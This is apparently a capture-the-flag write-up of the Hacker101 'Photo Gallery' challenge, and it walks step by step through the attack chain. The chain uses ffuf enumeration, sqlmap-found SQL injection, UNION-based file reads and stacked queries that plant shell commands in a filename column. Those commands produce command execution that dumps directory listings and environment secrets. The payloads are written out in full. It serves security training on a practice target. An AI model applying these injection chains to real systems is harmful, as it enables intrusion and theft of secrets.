# Photo Gallery

CTF: https://ctf.hacker101.com/ctf

## Recon

After load the page displays three images, the last one broken. The first thing I tend to do when get to a new page is to inspect the source code and the network calls made by the page.

In our network tab we notice calls to and endpoint `/fetch=<id>`. It's also interesting that the id with value `3` causes an Internal Server error while ids `1` and `2` are fine. Let's keep that in mind.

We might be able to get something out of an IDOR or SQLi.

Let's create a `range.txt` file with 50 ids and run those through `ffuf` for enumeration.

```sh
$ range 50 > range.txt
$ $ ffuf -w range.txt --mc "all" -u https://<subdomain>.ctf.hacker101.com/fetch?id=FUZZ
```

Nothing stands out here, only the first two images returns status `200`. In this case I used `--mc "all"` to display every response irrespective of status code since I wanted to see if we could find other ids that would give us an Internal Server Error, but we couldn't find another one besides `3`.

Does fetch reponds to a `POST`?

```sh
$ curl -X POST https://<subdomain>.ctf.hacker101.com/fetch
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

Seems like it doesn't. At this point I think we should try to discover more endpoints.

```sh
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u https://<subdomain>.ctf.hacker101.com/FUZZ
```

But we don't get anything out of this command. At this point my idea is to explore what the `id` argument can receive. Sending it the value `foo` we also get a `500`, which is interesting. Passing `"foo"` returns `404`.

At this point I'm convinced our input is causing some kind of internal query to error out, but we don't have access the output. Passing `"1"` instead of `1` makes the server return something interesting:

```
����JFIF�����ExifMM*JR(1Z�ih��paint.net 4.1��zzUNICODECREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 90 ��C  #,%!*!&4'*./121%6:60:,010��C  0  00000000000000000000000000000000000000000000000000����"�� ���}!1AQa"q2���#B��R��$3br�
...
```

Passing `"2"` also returns a similar output, but passing something like `"100"` returns not found.

I'm convinced that we can exploit this somehow, so let's turn to `sqlmap` to try all sorts of techniques for us.

## SQL Injection

```sh
$ sqlmap -u https://<subdomain>.ctf.hacker101.com/login?id=1 -p "id" --dump
...
[18:23:58] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' injectable 
...
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 312 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 9950=9950

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
    Payload: id=1 OR SLEEP(5)
---
[18:26:52] [INFO] the back-end DBMS is MySQL
```

And this allows us to dump the database:

```
Database: level5
Table: albums
[1 entry]
+----+---------+
| id | title   |
+----+---------+
| 1  | Kittens |
+----+---------+

Table: photos
[3 entries]
+----+------------------+--------+------------------------------------------------------------------+
| id | title            | parent | filename                                                         |
+----+------------------+--------+------------------------------------------------------------------+
| 1  | Utterly adorable | 1      | files/adorable.jpg                                               |
| 2  | Purrfect         | 1      | files/purrfect.jpg                                               |
| 3  | Invisible        | 1      | <weird value that looks like a hash> |
+----+------------------+--------+------------------------------------------------------------------+
```

Now we know the tables and columns and we can have an idea of how the server works. I would bet the query triggered from `/fetch?id=<id>` is something like:

```sql
SELECT filename FROM photos where id = <id>; 
```

This implies that the server loads whatever file name it gets from the database and sends it back to the client. Can we load other files besides our images? Let's keep this in mind after investigating the third entry in the `photos` table.

The query to `id` number `3` returns `500` because that file seems to be missing. Could this be one of our flags?

After trying to decrypt this is multiple ways, the answer to the question is YES. haha

## File loading

Let's get back to our hypothesis that we can load files from our server. Would it be possible to load any file using a query like the one below?

```sql
SELECT filename FROM photos where id = 4 UNION SELECT '<our file>'; 
```

Let's try it with `files/adorable.jpg ` since we know this file exists. I'm also using `id` as `4` because we know this `id` doesn't exist in our database.

```
https://<subdomain>.ctf.hacker101.com/fetch?id=4 UNION SELECT 'files/adorable.jpg'; --
```

And we get our status `200` answer as expected! The only problem is that we don't know how the files in our application are named. 

At this point I got a bit lost and had to get hints for this challenge, the one that helped me the most was:

```
This application runs on the uwsgi-nginx-flask-docker image
```

Which pointed me to: [https://github.com/tiangolo/uwsgi-nginx-flask-docker](https://github.com/tiangolo/uwsgi-nginx-flask-docker). 

According to this docker image we are running python and we usually have an `app` directory with files named:
* `uwsgi.ini`
* `main.py`

So I started querying for `main.py`  we get the file:

```
https://<subdomain>.ctf.hacker101.com/fetch?id=?id=4 UNION SELECT 'main.py'; --
```

And the response after inspectin the source code of the page:

```python
from flask import Flask, abort, redirect, request, Response
import base64, json, MySQLdb, os, re, subprocess
app = Flask(__name__)
home = '''
<!doctype html>
<html>
	<head>
		<title>Magical Image Gallery</title>
	</head>
	<body>
		<h1>Magical Image Gallery</h1>
$ALBUMS$
	</body>
</html>
'''
viewAlbum = '''
<!doctype html>
<html>
	<head>
		<title>$TITLE$ -- Magical Image Gallery</title>
	</head>
	<body>
		<h1>$TITLE$</h1>
$GALLERY$
	</body>
</html>
'''
def getDb():
	return MySQLdb.connect(host="localhost", user="root", password="", db="level5")
def sanitize(data):
	return data.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
@app.route('/')
def index():
	cur = getDb().cursor()
	cur.execute('SELECT id, title FROM albums')
	albums = list(cur.fetchall())
	rep = ''
	for id, title in albums:
		rep += '<h2>%s</h2>\n' % sanitize(title)
		rep += '<div>'
		cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))
		fns = []
		for pid, ptitle, pfn in cur.fetchall():
			rep += '<div><img src="[fetch?id=%i](view-source:https://67d88c594684dc2c38c7880002121440.ctf.hacker101.com/fetch?id=%i)" width="266" height="150"><br>%s</div>' % (pid, sanitize(ptitle))
			fns.append(pfn)
		rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
		rep += '</div>\n'
	return home.replace('$ALBUMS$', rep)
@app.route('/fetch')
def fetch():
	cur = getDb().cursor()
	if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0:
		abort(404)
	# It's dangerous to go alone, take this:
	# ^FLAG^...$FLAG$
	return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()
if __name__ == "__main__":
	app.run(host='0.0.0.0', port=80)
```

And we get our first flag! Besides that a few other things stand out in this source code.

### subprocess

The `subprocess.check_output` method accepts our file names. If we can somehow ovewrite a file name in the database we might get remote code execution.

```python
subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT)
```

Our plan is to do something like:

```sh
du -ch filenames; <our command> || exit 0
```

So we need to have a file named `; <our command>` as the **last one** in the list.

### Database query in the fetch endpoint

```sql
if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0
```

As we knew our query was vulnerable to SQL injection. MySQL also has a concept called stacked queries that allows us to send multiple queries to our database at the same time. If this is enabled we can inject whatever file name we want and cause remote code execution.

Let's validate this approach with an `id` like:

```sql
1; INSERT INTO photos (id, title, parent, filename) VALUES (4, 'Potato', 1, 'files/adorable.jpg');
```

This will:

1. Query for the `id=1` which we know exists
2. INSERT  new value in our database with a file that we know it exists

There's one trick to this though, we need to `commit` the value to our database. By default this doesn't happen as we can see in [this example](https://dev.mysql.com/doc/connector-python/en/connector-python-example-cursor-transaction.html).

So let's modify our payload above:

```sql
1; INSERT INTO photos (id, title, parent, filename) VALUES (4, 'Potato', 1, 'files/adorable.jpg'); commit;
```

And now querying with `/fetch?id=4` returns our image!

It's time to get remote code execution (RCE). Or so I though... By going back to the `index` page I notice that my new results didn't get displayed and only then I noticed the `LIMIT 3` in the query below:

```python
cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3'
```

I guess we need to update one of our records with the value we want instead of creating a new one. Or delete the existing ones, any solution is a valid one. Let's go with the `UPDATE` one and do some recon on the file system:

```
1; UPDATE photos SET filename=";ls > recon.txt" where id=3; commit;
```


Now we can go back to the `index` page so the `'du -ch <files>; <our command> || exit 0'` command is executed and then we can read our new file with:

```
?id=6 UNION SELECT 'recon.txt';
```

we get:

```
Dockerfile files main.py main.pyc prestart.sh recon.txt requirements.txt uwsgi.ini
```

Let's investigate these other files! After going over these one by one, the one that gave me an idea was `prestart.sh` since it contains the contents:

```
#!/bin/bash set -e service mysql start & python setup.py rm setup.py
```

Could this `setup.py` be adding something to our environment? Let's validate this by adding the contents out environment to our `recon.txt` file with the `env` command:

```
1; UPDATE photos SET filename=";env > recon.txt" where id=3; commit;
```

And reading this file gives us our last flag, and all the other ones!

```
...
FLAGS=["^FLAG^...$FLAG$","^FLAG^...$FLAG$","^FLAG^...$FLAG$"]
...
```

This was a fun challenge that forced us to put ourselves in the shoes of the developers and also to read some source code. I'm not entirely sure how I could have gone without getting a hint, so if you managed to do it without hints please reach out!

Thanks for reading and I will see you in our next post!